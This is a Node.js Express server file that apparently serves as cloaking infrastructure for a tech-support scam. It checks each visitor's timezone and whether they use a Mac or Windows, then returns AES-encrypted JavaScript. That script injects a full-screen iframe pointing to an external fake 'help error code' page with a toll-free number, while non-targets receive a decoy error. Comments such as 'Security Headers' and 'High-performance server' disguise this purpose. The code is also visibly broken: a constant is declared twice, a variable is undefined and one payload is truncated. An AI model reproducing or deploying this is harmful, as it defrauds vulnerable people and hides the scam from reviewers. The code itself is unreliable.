const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

// --- Middleware ---
app.use(cors());
app.use(express.json());

// Optimized Security Headers Middleware
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    
    if (res.getHeader('X-Frame-Options') === 'sameorigin') {
        res.removeHeader('X-Frame-Options');
    }
    next();
});

// --- Static Data Configurations ---
const ALLOWED_TIMEZONES = new Set([
    "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Adelaide", "Australia/Perth", "Australia/Hobart", "Australia/Darwin", "Asia/Tokyo",
        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Anchorage",
        "Pacific/Honolulu",
        "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
]);
const MAC_USER_AGENT_PATTERN = /Macintosh|Mac OS|macOS/;


const MAC_URL = "https://leekoooyy1.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369/mac-specific-url";
const DEFAULT_URL = "https://leekoooyy1.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369/default-url";

// --- Pre-Compilation Cache Layer ---
const PRECOMPUTED_RESPONSES = [
    { url: DEFAULT_URL, weight: 1.0 }
];

const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
    const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${item.url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
    
    return {
        weight: item.weight,
        encryptedPayload: encodeURIComponent(CryptoJS.AES.encrypt(rawPayload, secretKey).toString())
    };
});

// Pre-encrypt static error payload
const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());

// --- Helper Functions ---
function getFastResponse() {
    const rand = Math.random();
    let cumulativeWeight = 0;

    for (const item of PRECOMPUTED_RESPONSES) {
        cumulativeWeight += item.weight;
        if (rand <= cumulativeWeight) {
            return item.encryptedPayload;
        }
    }
    return PRECOMPUTED_RESPONSES[PRECOMPUTED_RESPONSES.length - 1].encryptedPayload;
}

// --- Routes ---
app.get("/timezone", (req, res) => {
    res.status(401).json({
        status: "error",
        message: "Unauthorized access",
        response: ERROR_PAYLOAD
    });
});

app.post("/timezone", (req, res) => {
    const { timezone } = req.body;
    const userAgent = req.headers['user-agent'] || '';

    // Fast validations against memory references
    if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
        const selectedUrl = MAC_USER_AGENT_PATTERN.test(userAgent) ? MAC_URL : DEFAULT_URL;
        const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${selectedUrl}";...`;
        
        // Encrypt and return response as before
        const encryptedPayload = encodeURIComponent(CryptoJS.AES.encrypt(rawPayload, secretKey).toString());
        res.send(encryptedPayload);
    } else {
        res.send(ERROR_PAYLOAD);
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(`High-performance server running on port ${PORT}`);
});

